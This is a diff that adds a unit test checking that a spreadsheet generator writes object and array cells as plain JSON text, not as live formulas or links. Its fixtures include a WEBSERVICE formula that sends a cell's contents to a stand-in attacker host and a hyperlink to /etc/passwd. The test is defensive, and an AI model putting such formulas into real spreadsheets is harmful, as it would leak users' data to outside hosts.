@@ -36,4 +36,29 @@ describe("generateXLSX (generate_spreadsheet)", () => {
     expect(sheet.getCell("B5").value).toBe("02134");
     expect(sheet.getCell("B1").value).toBe("Revenue");
   });
+
+  it("writes object and array cells as JSON text, not as ExcelJS formulas or links", async () => {
+    const dir = path.join(os.tmpdir(), `cowork-xlsx-${randomUUID()}`);
+    fs.mkdirSync(dir, { recursive: true });
+    const outputPath = path.join(dir, "objects.xlsx");
+    const link = { text: "Invoice", hyperlink: "file:///etc/passwd" };
+    const formula = { formula: 'WEBSERVICE("https://evil.example/?"&A1)' };
+
+    await generateXLSX(outputPath, {
+      sheets: [
+        {
+          name: "Cells",
+          headers: ["Label", formula] as Any,
+          rows: [[link, ["nested", 1]] as Any],
+        },
+      ],
+    });
+
+    const workbook = new ExcelJS.Workbook();
+    await workbook.xlsx.readFile(outputPath);
+    const sheet = workbook.getWorksheet("Cells")!;
+    expect(sheet.getCell("B1").value).toBe(JSON.stringify(formula));
+    expect(sheet.getCell("A2").value).toBe(JSON.stringify(link));
+    expect(sheet.getCell("B2").value).toBe('["nested",1]');
+  });
 });
